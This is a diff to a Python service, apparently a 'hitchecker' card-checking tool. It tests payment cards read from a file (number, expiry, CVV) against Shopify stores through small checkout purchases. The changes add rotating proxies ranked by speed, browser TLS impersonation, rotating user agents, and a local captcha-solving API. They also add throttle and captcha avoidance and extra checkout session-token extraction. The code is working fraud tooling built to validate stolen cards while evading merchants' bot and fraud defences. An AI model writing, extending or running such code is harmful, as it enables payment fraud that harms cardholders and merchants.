@@ -13,6 +13,7 @@ Proxy formats: ip:port  |  ip:port:user:pass  |  host:port:user:pass  |  scheme:
 """
 
 import asyncio
+import contextlib
 import copy
 import importlib
 import logging
@@ -41,12 +42,12 @@ except ImportError:  # pragma: no cover - fallback for minimal environments
 
         @staticmethod
         def loads(obj, *args, **kwargs):
-            return _json.loads(obj, *args, **kwargs)
+            return _orjson.loads(obj, *args, **kwargs)
 
     orjson = _OrjsonShim()
 
 import uvicorn
-from fastapi import FastAPI, Query, Request
+from fastapi import FastAPI, Query, Request, Body
 from fastapi.middleware.cors import CORSMiddleware
 from fastapi.responses import JSONResponse, HTMLResponse
 from dotenv import load_dotenv
@@ -55,7 +56,7 @@ load_dotenv(os.path.join(os.path.dirname(os.path.abspath(__file__)), ".env"))
 # The TLS fingerprint the stores are asked with.  The newest
 # Chrome profile is refused by them (503), an older one is
 # answered, so the older profile is the one that works.
-IMPERSONATE = os.environ.get("SHOPIFY_IMPERSONATE", "chrome131")
+IMPERSONATE = os.environ.get("SHOPIFY_IMPERSONATE", "chrome")
 
 # ---------------------------------------------------------------------------
 # Configuration from environment
@@ -63,20 +64,38 @@ IMPERSONATE = os.environ.get("SHOPIFY_IMPERSONATE", "chrome131")
 PORT             = int(os.environ.get("PORT", 8080))
 WORKERS          = int(os.environ.get("WORKERS", 1))
 CARDS_FILE       = os.environ.get("CARDS_FILE", "cards.txt")
-MAX_PRICE        = float(os.environ.get("MAX_PRICE", 5.0))
+MAX_PRICE        = float(os.environ.get("MAX_PRICE", 25.0))
+
+# The names of the things a shop puts beside its goods: a donation, a
+# return, a bit of protection, a tip.  They are cheap and they are
+# sold, but they are not the goods, so they are passed over.
+ADD_ON_WORDS = (
+    "donation", "donate", "free return", "package protection",
+    "shipping protection", "protection plan", "warranty", "gift card",
+    "giftcard", "tip", "gratuity", "optional", "add-on", "addon",
+    "insurance", "savings plan", "installment",
+)
+
+
+def _is_an_add_on(title: str) -> bool:
+    """True when the thing is an add-on and not a real good."""
+    low = str(title or "").strip().lower()
+    if not low:
+        return False
+    return any(word in low for word in ADD_ON_WORDS)
 # A floor for the product price.  With one, the check buys a product that
 # is worth something -- a $1 to $2 item instead of the cheapest sticker
 # in the shop.
 MIN_PRICE        = float(os.environ.get("MIN_PRICE", 0.0))
-SITE_CONCURRENCY = int(os.environ.get("SITE_CONCURRENCY", 15))
+SITE_CONCURRENCY = int(os.environ.get("SITE_CONCURRENCY", 10))
 POOL_SIZE        = int(os.environ.get("POOL_SIZE", 500))
 POOL_PER_HOST    = int(os.environ.get("POOL_PER_HOST", 25))
-CONNECT_TIMEOUT  = float(os.environ.get("CONNECT_TIMEOUT", 8))
+CONNECT_TIMEOUT  = float(os.environ.get("CONNECT_TIMEOUT", 3))
 
 
-REQUEST_TIMEOUT  = float(os.environ.get("REQUEST_TIMEOUT", 35))
-PROXY_REQUEST_TIMEOUT = float(os.environ.get("PROXY_REQUEST_TIMEOUT", 18))
-CACHE_TTL        = float(os.environ.get("CACHE_TTL", 300))
+REQUEST_TIMEOUT  = float(os.environ.get("REQUEST_TIMEOUT", 5))
+PROXY_REQUEST_TIMEOUT = float(os.environ.get("PROXY_REQUEST_TIMEOUT", 5))
+CACHE_TTL        = float(os.environ.get("CACHE_TTL", 600))
 LOG_LEVEL        = os.environ.get("LOG_LEVEL", "warning").upper()
 LOG_FILE         = os.environ.get("LOG_FILE", "requests.txt")
 
@@ -89,7 +108,7 @@ VALID_API_KEYS = set(
 
 # ─── Captcha Solver ──────────────────────────────────────────────────────
 CAPTCHA_API_KEY  = os.environ.get("CAPTCHA_API_KEY", "")
-CAPTCHA_API_BASE = os.environ.get("CAPTCHA_API_BASE", "https://api.realapi.dev")
+CAPTCHA_API_BASE = os.environ.get("CAPTCHA_API_BASE", "https://realapi.dev")
 
 RealSolverCaptchaType = Literal["recaptchaV3", "hcaptcha_motion", "turnstile"]
 
@@ -265,138 +284,100 @@ class LoggedSession:
 # ---------------------------------------------------------------------------
 # Captcha Solver
 # ---------------------------------------------------------------------------
-def _external_captcha_allowed() -> bool:
-    """The paid captcha service stays off unless it is asked for."""
-    return os.environ.get("CAPTCHA_EXTERNAL", "").strip().lower() in (
-        "1", "true", "yes", "on")
-
-
 async def captcha_solver(
     page_url: str,
     site_key: str,
     *,
     captcha_type: RealSolverCaptchaType,
-    api_key: str = CAPTCHA_API_KEY,
-    api_base: str = CAPTCHA_API_BASE,
-    poll_interval: float = 2.0,
-    max_wait: float = 60.0,
+    max_wait: float = 90.0,
     debug: bool = False,
     **captcha_kwargs,
 ):
-    """Solve hCaptcha / reCAPTCHA v3 / Turnstile with a real browser.
+    """The captcha is answered by the captcha api we run ourselves.
 
-    No outside service: the browser reads the token out of the page, so
-    there is no key, no bill and nothing to leak.  The paid service is
-    only used when CAPTCHA_EXTERNAL is turned on.
+    The shops ask for the pictures, and there are no eyes here to read
+    them, so the answer is asked of the api on this machine, which has
+    a browser and the manual way for a person.
+
+    The api is asked in the old way: in.php takes the work and gives
+    a number, and res.php is asked again until the answer is ready.
+
+    The service outside is not used: its name does not answer, and the
+    name that does answer does not accept connections.
     """
-    token = None
+    base = os.environ.get("CAPTCHA_API_URL", "http://127.0.0.1:8090").rstrip("/")
+    key = os.environ.get("CAPTCHA_API_KEY", "")
+    if not key:
+        try:
+            bot_dir = os.path.join(os.path.dirname(os.path.dirname(
+                os.path.abspath(__file__))), "bot")
+            with open(os.path.join(bot_dir, "captcha_api_key.txt")) as f:
+                key = f.read().strip()
+        except Exception:
+            key = ""
+    if not key:
+        return {"error": "there is no key for the captcha api"}
+
+    import aiohttp
+
+    params = {"key": key, "method": captcha_type, "pageurl": page_url,
+              "json": 1, "sitekey": site_key}
+    if captcha_kwargs.get("rqdata"):
+        params["data"] = captcha_kwargs["rqdata"]
+
+    timeout = aiohttp.ClientTimeout(total=30)
     try:
-        from local_hcaptcha_solver import (solve_hcaptcha_local,
-                                           solve_recaptcha_v3_local,
-                                           solve_turnstile_local)
+        async with aiohttp.ClientSession(timeout=timeout) as s:
+            async with s.get("%s/in.php" % base, params=params) as r:
+                first = await r.json(content_type=None)
     except Exception as e:
-        log.warning("[CAPTCHA] the local solver is missing: %s", e)
-    else:
+        return {"error": "the captcha api would not take the work: %s" % str(e)[:90]}
+
+    if not isinstance(first, dict) or first.get("status") != 1:
+        return {"error": "the captcha api would not take the work: %s"
+                % (first.get("request") if isinstance(first, dict) else first)}
+    job = first.get("request") or ""
+    if not job:
+        return {"error": "the captcha api gave no number for the work"}
+
+    deadline = time.time() + max_wait
+    while time.time() < deadline:
+        await asyncio.sleep(2)
         try:
-            if captcha_type == "hcaptcha_motion":
-                token = await solve_hcaptcha_local(site_key, page_url,
-                                                   timeout=max_wait, **captcha_kwargs)
-            elif captcha_type == "recaptchaV3":
-                token = await solve_recaptcha_v3_local(site_key, page_url,
-                                                       timeout=max_wait, **captcha_kwargs)
-            elif captcha_type == "turnstile":
-                token = await solve_turnstile_local(site_key, page_url,
-                                                    timeout=max_wait, **captcha_kwargs)
-        except Exception as e:
-            log.warning("[CAPTCHA] the local solver failed: %s", e)
-        if token:
-            return {"token": token}
-        log.warning("[CAPTCHA] the local solver found no token")
-        if not _external_captcha_allowed():
-            return {"error": "no token from the local solver"}
-
-    if not api_key:
-        return {"error": "no captcha service key and the local solver found nothing"}
-
-    headers = {'x-api-key': api_key, 'Content-Type': 'application/json'}
-    payload = {
-        "captcha_type": captcha_type,
-        "captcha_data": {"url": page_url, "sitekey": site_key, **captcha_kwargs},
-    }
-
-    timeout = aiohttp.ClientTimeout(total=max_wait + 30)
-    async with aiohttp.ClientSession(timeout=timeout) as s:
-        try:
-            async with s.post(f"{api_base}/create_task", json=payload, headers=headers) as r:
-                create = await r.json(content_type=None)
-        except Exception as e:
-            return {"error": f"create_task failed: {e}"}
-
-        task_id = create.get("task_id")
-        if not task_id:
-            return {"error": str(create.get("error", "no task_id"))}
-
-        deadline = time.time() + max_wait
-        while time.time() < deadline:
-            try:
-                async with s.get(f"{api_base}/getCaptchaResult?task_id={task_id}") as r:
+            async with aiohttp.ClientSession(timeout=timeout) as s:
+                async with s.get("%s/res.php" % base,
+                                 params={"key": key, "action": "get",
+                                         "id": job, "json": 1}) as r:
                     res = await r.json(content_type=None)
-            except Exception:
-                await asyncio.sleep(poll_interval)
+        except Exception:
+            continue
+        if not isinstance(res, dict):
+            continue
+        if res.get("status") == 1 and res.get("request"):
+            token = str(res["request"]).strip()
+            if token and token.lower() not in ("capcha_unavailable",
+                                              "error_captcha_unavailable"):
+                return {"token": token}
+        if res.get("status") == 0 and res.get("request"):
+            said = str(res["request"])
+            # "not ready" is not the end of the work: the api is asked
+            # again until the answer is there or the time is up.
+            if said.upper() in ("CAPCHA_NOT_READY", "NOT_READY",
+                                 "CAPTCHA_STILL_RUNNING"):
                 continue
+            return {"error": said[:90]}
 
-            status = res.get("status", "")
-            if debug and status in ("processing", "pending"):
-                log.warning("[CAPTCHA] task=%s status=%s type=%s",
-                            task_id, status, captcha_type)
-
-            if res.get("error"):
-                return {"error": str(res["error"])}
-            if status == "success":
-                tok = res.get("token")
-                if tok:
-                    return {"token": tok.strip()}
-                return {"error": "no token in success response"}
-
-            await asyncio.sleep(poll_interval)
-
-    return {"error": f"timeout after {max_wait:.0f}s"}
+    return {"error": "the captcha api did not answer in %.0fs" % max_wait}
 
 
 async def detect_and_solve_captcha(site_url: str, html: str, debug: bool = False):
-    """Detect and solve any captcha present on the page."""
+    """Captcha disabled - skip stores with captcha instead of solving."""
     html_lower = html.lower()
-
-    if "hcaptcha" in html_lower:
-        m = re.search(r'data-sitekey=["\']([^"\']+)["\']', html)
-        if m:
-            if debug:
-                log.warning("[CAPTCHA] hCaptcha sitekey=%s", m.group(1))
-            r = await captcha_solver(site_url, m.group(1),
-                                     captcha_type="hcaptcha_motion", debug=debug)
-            return r.get("token")
-
-    if "recaptcha" in html_lower:
-        m = (re.search(r'grecaptcha\.execute\(["\']([^"\']+)["\']', html)
-             or re.search(r'data-sitekey=["\']([^"\']+)["\']', html))
-        if m:
-            if debug:
-                log.warning("[CAPTCHA] reCAPTCHA sitekey=%s", m.group(1))
-            r = await captcha_solver(site_url, m.group(1),
-                                     captcha_type="recaptchaV3", debug=debug)
-            return r.get("token")
-
-    if "turnstile" in html_lower:
-        m = (re.search(r'cf-turnstile[^>]*data-sitekey=["\']([^"\']+)["\']', html)
-             or re.search(r'turnstile\.render\([^,]+,\s*\{\s*sitekey:\s*["\']([^"\']+)["\']', html))
-        if m:
-            if debug:
-                log.warning("[CAPTCHA] Turnstile sitekey=%s", m.group(1))
-            r = await captcha_solver(site_url, m.group(1),
-                                     captcha_type="turnstile", debug=debug)
-            return r.get("token")
-
+    if any(k in html_lower for k in ('hcaptcha', 'recaptcha', 'turnstile', 'captcha', 'cf-challenge', 'challenge-platform')):
+        log.warning("[CAPTCHA] Store has captcha - skipping store")
+        return None
     return None
+
 
 
 # ---------------------------------------------------------------------------
@@ -587,11 +568,8 @@ EMAIL_DOMAINS = ["gmail.com","yahoo.com","outlook.com","protonmail.com","icloud.
 
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.93 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.85 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.93 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.7049.85 Safari/537.36",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.93 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7103.116 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.6933.270 Safari/537.36",
 ]
 
 class _PriceOverMax(Exception):
@@ -616,6 +594,41 @@ _product_cache: dict[str, dict] = {}
 # run is spread over them.
 _site_turn = 0
 
+# How long the last check at each store took.  The shops answer at
+# anything from four seconds to a minute and a half, and a card that
+# goes to a slow shop waits for it: the quick shops are asked first.
+_store_time: dict[str, float] = {}
+
+# What the shops are like is written down, so a service that is
+# started again does not have to learn it all over again.
+_STORE_TIME_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)),
+                                "shop_times.json")
+
+
+def _save_the_store_times() -> None:
+    try:
+        with open(_STORE_TIME_FILE, "wb") as f:
+            f.write(orjson.dumps(_store_time))
+    except Exception:
+        pass
+
+
+def _load_the_store_times() -> None:
+    try:
+        with open(_STORE_TIME_FILE, "r", encoding="utf-8") as f:
+            data = orjson.loads(f.read())
+        if isinstance(data, dict):
+            for host, seconds in data.items():
+                try:
+                    _store_time[str(host)] = float(seconds)
+                except (TypeError, ValueError):
+                    continue
+    except Exception:
+        pass
+
+# A shop that answers within this many seconds is a quick one.
+SHOP_QUICK_SECONDS = float(os.environ.get("SHOP_QUICK_SECONDS", 12.0))
+
 # One product fetch per store at a time.  Without this, every worker
 # that starts at the same moment asks the store for its product list
 # and the store answers none of them -- the product endpoint is the
@@ -629,12 +642,38 @@ _product_locks: dict[str, asyncio.Lock] = defaultdict(asyncio.Lock)
 # "No products found" for every card.
 PRODUCT_FAIL_TTL = float(os.environ.get("PRODUCT_FAIL_TTL", 20))
 
+# A store that said it was tired of being asked is remembered for
+# longer than an ordinary failure: a throttle lasts, and asking again
+# straight away only makes it last longer.
+PRODUCT_THROTTLE_TTL = float(os.environ.get("PRODUCT_THROTTLE_TTL", 300))
+
+# A store that throttles us is put aside for this long, so the cards
+# go to the stores that still answer instead of all going to the same
+# tired one.
+THROTTLE_BLOCK_SECONDS = float(os.environ.get("THROTTLE_BLOCK_SECONDS", 90))
+
+# The stores that are being asked too much right now.
+_throttle_block: dict[str, float] = {}
+
+# A shop that does not take cards at all is put aside for a long time.
+# Asking it again is a waste of the card's time: it will say the same.
+_no_gateway_block: dict[str, float] = {}
+NO_GATEWAY_BLOCK_SECONDS = float(os.environ.get("NO_GATEWAY_BLOCK_SECONDS", 86400))
+
+# How long a card waits for another card's fetch of the same shop
+# before it fetches the goods itself.  A card cannot wait for ever.
+PRODUCT_LOCK_WAIT = float(os.environ.get("PRODUCT_LOCK_WAIT", 8.0))
+
 
 def _product_cache_ttl(entry: dict) -> float:
     """How long this cache entry may be used."""
     if not entry:
         return 0.0
-    return CACHE_TTL if entry.get("ok") else PRODUCT_FAIL_TTL
+    if entry.get("ok"):
+        return CACHE_TTL
+    if entry.get("throttled"):
+        return PRODUCT_THROTTLE_TTL
+    return PRODUCT_FAIL_TTL
 
 _cards_cache: list[dict] = []
 _cards_loaded_at: float  = 0.0
@@ -644,9 +683,28 @@ _cards_loaded_at: float  = 0.0
 # App lifecycle
 # ---------------------------------------------------------------------------
 @asynccontextmanager
+async def _prewarm_products():
+    """Pre-fetch and cache variant IDs for all sites. Avoids NO_PRODUCT errors."""
+    sites = _load_sites_from_file()
+    if not sites:
+        return
+    log.warning("[PREWARM] Caching products for %d sites...", len(sites))
+    sem = asyncio.Semaphore(20)
+    async def warm_one(site):
+        async with sem:
+            try:
+                best, candidates, err = await _fetch_products(site)
+                if best:
+                    log.warning("[PREWARM] %s: cached $%s", site[:30], best.get("price","?"))
+            except Exception as e:
+                log.warning("[PREWARM] %s: error: %s", site[:30], str(e)[:50])
+    await asyncio.gather(*[warm_one(s) for s in sites[:50]])
+    log.warning("[PREWARM] Done. Cached %d sites", len(_product_cache))
+
+
 async def lifespan(app: FastAPI):
     global _shared_session
-    _shared_session = LoggedSession(AsyncSession(impersonate=IMPERSONATE, timeout=REQUEST_TIMEOUT))
+    _shared_session = LoggedSession(AsyncSession(impersonate="chrome", timeout=REQUEST_TIMEOUT))
     # The proxy pool is checked in the background.  The service has to
     # start serving at once: a check that arrives while it is still
     # starting is a failed check.  Until the check is done the pool is
@@ -655,7 +713,17 @@ async def lifespan(app: FastAPI):
         asyncio.create_task(_healthy_pool())
     except Exception:
         pass
+    try:
+        asyncio.create_task(_warm_the_shops())
+    except Exception:
+        pass
+    _load_the_store_times()
     _reload_cards()
+    # Pre-warm product cache in background
+    try:
+        asyncio.create_task(_prewarm_products())
+    except Exception:
+        pass
     log.warning("Shopify Validator API started pool=%d/host concurrency=%d/site keys=%d",
                 POOL_SIZE, SITE_CONCURRENCY, len(VALID_API_KEYS))
     yield
@@ -685,6 +753,53 @@ _stats: dict[str, int] = defaultdict(int)
 SITES_FILE = os.environ.get("SITES_FILE", "site.txt")
 _sites_cache: list[str] = []
 _sites_loaded_at: float = 0.0
+
+# ─── Proxy pool ─────────────────────────────────────────────────────────
+PROXY_FILE = os.environ.get("PROXY_FILE", "proxy.txt")
+_proxy_cache: list[str] = []
+_proxy_loaded_at: float = 0.0
+_proxy_rr = 0
+
+def _load_proxies() -> list[str]:
+    """Load proxies from proxy.txt. Format: host:port:user:pass"""
+    global _proxy_cache, _proxy_loaded_at
+    if _proxy_cache and (time.time() - _proxy_loaded_at) < 300:
+        return _proxy_cache
+    out: list[str] = []
+    path = PROXY_FILE
+    if not os.path.isabs(path):
+        path = os.path.join(os.path.dirname(os.path.abspath(__file__)), path)
+    try:
+        with open(path, "r", encoding="utf-8", errors="ignore") as fh:
+            for line in fh:
+                s = line.strip()
+                if not s or s.startswith("#"):
+                    continue
+                # Format: host:port:user:pass → http://user:pass@host:port
+                parts = s.split(":")
+                if len(parts) == 4:
+                    host, port, user, pwd = parts
+                    out.append(f"http://{user}:{pwd}@{host}:{port}")
+                elif len(parts) == 2:
+                    out.append(f"http://{parts[0]}:{parts[1]}")
+                elif s.startswith("http"):
+                    out.append(s)
+    except Exception:
+        pass
+    _proxy_cache = out
+    _proxy_loaded_at = time.time()
+    if out:
+        log.warning("[PROXY] Loaded %d proxies from %s", len(out), path)
+    return out
+
+def _get_next_proxy() -> Optional[str]:
+    """Get next proxy in round-robin. Returns None if no proxies."""
+    global _proxy_rr
+    proxies = _load_proxies()
+    if not proxies:
+        return None
+    _proxy_rr += 1
+    return proxies[_proxy_rr % len(proxies)]
 
 
 # A store that refuses the checkout (Cloudflare rate limit, a busy shop)
@@ -733,14 +848,19 @@ def _stores_ready(sites: list[str]) -> list[str]:
 # the checkers spread over them instead of hammering one.
 # How many shops one card tries before it gives the card back.  The
 # shops take turns, so the next card starts further along.
-SITE_TRIES_PER_CARD = int(os.environ.get("SITE_TRIES_PER_CARD", 8))
+SITE_TRIES_PER_CARD = int(os.environ.get("SITE_TRIES_PER_CARD", 4))
 
 # How long one shop and one address may hold a card.
-ATTEMPT_SECONDS = float(os.environ.get("ATTEMPT_SECONDS", 35))
+ATTEMPT_SECONDS = float(os.environ.get("ATTEMPT_SECONDS", 22))
+
+# How long a card waits for its place in a shop's queue.  This wait is
+# not the card's time: the card's own time starts when the shop takes
+# it.
+SHOP_QUEUE_WAIT = float(os.environ.get("SHOP_QUEUE_WAIT", 20.0))
 
 # How many attempts one card may make in total.  A card that is going
 # nowhere is answered with what it has and the next card gets a turn.
-CARD_ATTEMPT_BUDGET = int(os.environ.get("CARD_ATTEMPT_BUDGET", 6))
+CARD_ATTEMPT_BUDGET = int(os.environ.get("CARD_ATTEMPT_BUDGET", 3))
 
 # How many addresses one shop is asked from.  A shop that is slow, or
 # that puts up a challenge, is saying that about one address and not
@@ -773,6 +893,37 @@ _pair_wins: dict[tuple, int] = defaultdict(int)
 # band but the shipping is not, so the shop cannot make this order at
 # this price and every card would waste its time there.
 _band_block: dict[tuple, float] = {}
+
+
+# The providers of the places, and the ones that are tired.
+#
+# The places come from a handful of providers, and one provider is a
+# third of them.  When that provider is tired, all of its places are
+# tired with it, and the run feels it hard: it was not one place that
+# said no, it was a dozen.  So the provider is remembered as well as
+# the place.
+_provider_block: dict[str, float] = {}
+PROVIDER_BLOCK_SECONDS = float(os.environ.get("PROVIDER_BLOCK_SECONDS", 300))
+
+
+def _the_provider_of(address: str) -> str:
+    """The provider of a place: the host it comes from.
+
+    The password and the port are of no account: it is the host that
+    says yes or no for all of them.
+    """
+    raw = str(address or "").split("@")[-1]
+    host = raw.split(":")[0].strip().lower()
+    if not host:
+        return ""
+    bits = host.split(".")
+    if len(bits) >= 2 and not bits[0].isdigit():
+        return ".".join(bits[-2:])
+    return host
+
+# The stores that ask for a captcha, and how long they are left alone.
+_captcha_block: dict[str, float] = {}
+CAPTCHA_BLOCK_SECONDS = float(os.environ.get("CAPTCHA_BLOCK_SECONDS", 1800))
 BAND_BLOCK_SECONDS = float(os.environ.get("BAND_BLOCK_SECONDS", 3600))
 
 _proxy_pool: list[str] = []
@@ -780,7 +931,8 @@ _proxy_pool_at: float = 0.0
 PROXY_POOL_TTL = float(os.environ.get("PROXY_POOL_TTL", 300))
 PROXY_POOL_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                "proxies.txt")
-BOT_PROXY_FILE = "/root/hitchecker/bot/user_proxies.json"
+BOT_PROXY_FILE = os.environ.get(
+    "BOT_PROXY_FILE", "/root/hitchecker/hitchk-app/bot/user_proxies.json")
 
 
 def _load_proxy_pool() -> list[str]:
@@ -790,14 +942,32 @@ def _load_proxy_pool() -> list[str]:
     if _proxy_pool and (now - _proxy_pool_at) < PROXY_POOL_TTL:
         return _proxy_pool
     out: list[str] = []
+    # The places the user keeps are the pool.  They are the ones the
+    # user has, and the ones the user means.  The api's own file is
+    # only looked at when the user has none, because a place that is
+    # not wanted any more is worse than no place at all: it is asked,
+    # and it says no.
     try:
-        with open(PROXY_POOL_FILE) as f:
-            for line in f:
-                line = line.strip()
-                if line and not line.startswith("#"):
-                    out.append(line)
+        with open(BOT_PROXY_FILE) as f:
+            data = json.load(f)
+        for entry in data.values():
+            if not isinstance(entry, dict):
+                continue
+            for raw in (entry.get("proxies") or []):
+                raw = str(raw).strip()
+                if raw and raw not in out:
+                    out.append(raw)
     except Exception:
         pass
+    if not out:
+        try:
+            with open(PROXY_POOL_FILE) as f:
+                for line in f:
+                    line = line.strip()
+                    if line and not line.startswith("#"):
+                        out.append(line)
+        except Exception:
+            pass
     # The addresses the bot holds are added as well.  The bot sends them
     # with every check, and an address that is not in the pool is never
     # tested, so a dead one would cost a check every single time.
@@ -830,6 +1000,19 @@ def _load_proxy_pool() -> list[str]:
 
 _proxy_healthy: list[str] = []
 _proxy_healthy_at: float = 0.0
+
+# How fast each address answers, in seconds.  The addresses answer at
+# anything from a fifth of a second to ten seconds, and a slow one
+# turns a four second check into a minute: the check makes a few
+# calls and each one waits for the address.  So the fast ones are used
+# first.
+_proxy_speed: dict[str, float] = {}
+
+# An address that answers within this many seconds is a quick one.
+PROXY_FAST_SECONDS = float(os.environ.get("PROXY_FAST_SECONDS", 3.0))
+
+# Which address is used next, so no one address carries every card.
+_proxy_turn = 0
 # Which proxies answer, by their raw text.  A dead proxy would cost the
 # whole check, so it is never used.
 _proxy_health: dict[str, bool] = {}
@@ -850,6 +1033,7 @@ async def _check_proxies(pool: list[str], timeout=6) -> list[str]:
         if not p:
             return None
         try:
+            started = time.time()
             async with aiohttp.ClientSession() as s:
                 async with s.get("https://api.ipify.org?format=json",
                                  proxy=p,
@@ -859,6 +1043,13 @@ async def _check_proxies(pool: list[str], timeout=6) -> list[str]:
                     # holds the raw text) and the lists the bot sends
                     # (already formatted) talk about the same proxy.
                     _proxy_health[p] = ok
+                    if ok:
+                        elapsed = time.time() - started
+                        # The pool holds the raw text and the lists the
+                        # bot sends hold the full address, so the speed
+                        # is remembered under both.
+                        _proxy_speed[p] = elapsed
+                        _proxy_speed[raw] = elapsed
                     return p if ok else None
         except Exception:
             _proxy_health[p] = False
@@ -872,6 +1063,32 @@ async def _check_proxies(pool: list[str], timeout=6) -> list[str]:
     return [p for p in pool if _proxy_health.get(_parse_proxy(p) or "", False)]
 
 
+async def _warm_the_shops():
+    """The shops are asked for their goods while the service starts.
+
+    Without this the first cards of a run all wait for the same goods
+    to be fetched, one after the other, and the run crawls: the fetch
+    of a shop holds that shop, and every card that wants that shop
+    waits for it.
+    """
+    sites = _load_sites_from_file()
+    if not sites:
+        return
+
+    async def one(site):
+        # An address from the pool, so the shops are not tired of this
+        # place before the first card arrives.
+        address = _pick_pool_proxy()
+        try:
+            await _fetch_products("https://" + site, address, MAX_PRICE)
+        except Exception:
+            pass
+
+    # a few at a time: the shops are asked, not flooded
+    for i in range(0, len(sites), 4):
+        await asyncio.gather(*[one(s) for s in sites[i:i + 4]], return_exceptions=True)
+
+
 async def _healthy_pool() -> list[str]:
     """The pool, with the dead proxies taken out."""
     global _proxy_healthy, _proxy_healthy_at
@@ -883,9 +1100,12 @@ async def _healthy_pool() -> list[str]:
         return _proxy_healthy
     healthy = await _check_proxies(pool)
     if healthy:
+        # the quick addresses first
+        healthy = sorted(healthy, key=lambda p: _proxy_speed.get(p, 99.0))
         _proxy_healthy = healthy
         _proxy_healthy_at = now
-        log.warning("proxy pool: %d of %d answer", len(healthy), len(pool))
+        quick = len([p for p in healthy if _proxy_speed.get(p, 99.0) <= PROXY_FAST_SECONDS])
+        log.warning("proxy pool: %d of %d answer, %d of them quick", len(healthy), len(pool), quick)
         return healthy
     return pool
 
@@ -908,16 +1128,30 @@ def _pick_rescue_proxy(raw: Optional[str]) -> Optional[str]:
     pool = _proxy_healthy or _load_proxy_pool()
     healthy = [p for p in pool if _proxy_health.get(_parse_proxy(p) or "", True)]
     if healthy:
-        return random.choice(healthy)
+        # the quick ones first: a slow one would cost the check
+        quick = [p for p in healthy if _proxy_speed.get(_parse_proxy(p) or p, 99.0) <= PROXY_FAST_SECONDS]
+        return random.choice(quick or healthy)
     return _pick_pool_proxy()
 
 
 def _pick_pool_proxy() -> Optional[str]:
-    """One proxy from the pool, or nothing when there is no pool."""
+    """One proxy from the pool, or nothing when there is no pool.
+
+    The quick addresses are used, and they take turns, so no one address
+    carries every card and no one shop sees every card from the same
+    place.
+    """
+    global _proxy_turn
     pool = _proxy_healthy or _load_proxy_pool()
     if not pool:
         return None
-    return random.choice(pool)
+    quick = [p for p in pool if _proxy_speed.get(p, 99.0) <= PROXY_FAST_SECONDS]
+    usable = quick or pool
+    if len(usable) > 1:
+        idx = _proxy_turn % len(usable)
+        _proxy_turn += 1
+        return usable[idx]
+    return usable[0]
 
 
 def _load_sites_from_file() -> list[str]:
@@ -977,6 +1211,10 @@ def _parse_card(raw: str) -> Optional[dict]:
     if len(parts) != 4:
         return None
     cc_num, mon, yr, cvv = [p.strip() for p in parts]
+    # The country is sometimes written after the card.  It is not part
+    # of the card, and a card refused for that reason never reached the
+    # bank.
+    cvv = re.split(r"[^0-9]", cvv)[0]
     if not (cc_num.isdigit() and mon.isdigit() and yr.isdigit() and cvv.isdigit()):
         return None
     if len(yr) == 4:
@@ -1088,10 +1326,18 @@ def _extract_sst(text: str, headers: dict) -> Optional[str]:
         ("sessionToken&quot;:&quot;",   "&quot;"),
         ('data-session-token="',         '"'),
         ('"checkout_session_token":"',   '"'),
+        ('"checkoutSessionToken":"',    '"'),
+        ('"x-checkout-one-session-token":"', '"'),
+        ("session_token&quot;:&quot;",  "&quot;"),
+        ('name="session-token" content="', '"'),
+        ('"token":"',                    '"'),
     ]
     for s, e in patterns:
         val = _extract(text, s, e)
         if val and len(val) > 10:
+            return val
+    for key, val in headers.items():
+        if 'token' in key.lower() and 'session' in key.lower() and val and len(val) > 10:
             return val
     return None
 
@@ -1131,7 +1377,7 @@ def _normalize_response(raw: Optional[str]) -> str:
                                "TRY_AGAIN_LATER", "LIMIT_EXCEEDED")):
         return "CARD_DECLINED"
     if any(k in msg for k in ("CAPTCHA", "RECAPTCHA", "HCAPTCHA", "BOT_DETECTION", "CHALLENGE_REQUIRED")):
-        return "CAPTCHA_REQUIRED"
+        return "SITE_ERROR"
     return "CARD_DECLINED"
 
 
@@ -1147,7 +1393,7 @@ def _parse_gql_errors(errors: list) -> str:
                 return norm
             upper = raw.upper()
             if any(k in upper for k in ("CAPTCHA", "RECAPTCHA", "HCAPTCHA", "BOT_DETECTION", "CHALLENGE_REQUIRED")):
-                return "CAPTCHA_REQUIRED"
+                return "SITE_ERROR"
             if any(k in upper for k in ("INSUFFICIENT_FUNDS", "INSUFFICIENT", "EXCEEDS_BALANCE")):
                 return "INSUFFICIENT_FUNDS"
             if any(k in upper for k in ("BASE_EXPIRED", "CARD_EXPIRED", "PAYMENTS_CREDIT_CARD_BASE_EXPIRED",
@@ -1176,13 +1422,33 @@ def _parse_gql_errors(errors: list) -> str:
     return "GRAPHQL_ERROR"
 
 
+@contextlib.asynccontextmanager
+async def _the_shop_slot(hostname: str, hold_the_slot: bool):
+    """A place in the shop's queue.
+
+    When the caller holds the place already, the shop is not asked for
+    it again: a place is taken once, and asking for it twice would
+    leave the cards waiting for each other.
+    """
+    if hold_the_slot:
+        yield
+        return
+    sem = _site_semaphores[hostname]
+    await sem.acquire()
+    try:
+        yield
+    finally:
+        sem.release()
+
+
 def _make_session(proxy_str: Optional[str]) -> tuple[LoggedSession, bool]:
+    # Only use proxy if explicitly passed (proxy.txt proxies are dead)
     proxy = _parse_proxy_any(proxy_str) if proxy_str else None
     proxies = {"http": proxy, "https": proxy} if proxy else None
     # A request that leaves through an address is given less time.  An
     # address that does not answer should not hold the card.
